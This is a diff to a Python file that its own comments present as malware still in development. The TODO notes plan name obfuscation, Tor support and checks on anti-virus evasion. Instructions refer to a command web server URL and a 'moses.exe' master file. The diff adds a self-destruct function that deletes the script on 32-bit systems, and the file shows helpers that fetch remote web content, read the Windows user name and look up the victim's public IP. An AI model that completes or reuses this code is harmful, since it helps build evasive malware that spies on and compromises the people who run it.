@@ -5,9 +5,10 @@ from datetime import datetime
 
 # TODO: obfuscate all function and variable names after completion
 # TODO: setup tor capability
-# TODO: change os.system to subprocess (check ssh_chat program)
+# TODO: change all os.system commands to subprocess (check ssh_chat program)
 # TODO: COMPLETE THE PROGRAM, as it is still under construction and currently incomplete
 # TODO: check anti-virus evasion/efficacy again
+
 # NOTE: READ INSTRUCTIONS BELOW
 #
 # 1) Make the required changes to Moses (Variable of URL of web server and master_filename variable if changing the master_filename of the moses.exe file)
@@ -19,9 +20,7 @@ from datetime import datetime
 #
 
 def main():
-    if (check_platform() == "32-bit"):
-        # TODO: implement a self-destruct function if 32-bit? (maybe)
-        pass
+    #death() # self destruct
 
     URL = "http://website.tld" #NO SLASH AT THE END OF THE URL
     master_filename = "moses.exe"
@@ -93,6 +92,10 @@ def get_web_content(URL, wb_path):
     except:
         web_content = ""
     return web_content
+
+def death():
+    if (check_platform() == "32-bit"):
+        os.remove("asd.py")
 
 # used for getting system username
 def get_win_user():
@@ -222,5 +225,5 @@ def get_pub_ip_address(sys_username):
     except:
         web_content = ""
     return web_content
-    
+
 main()
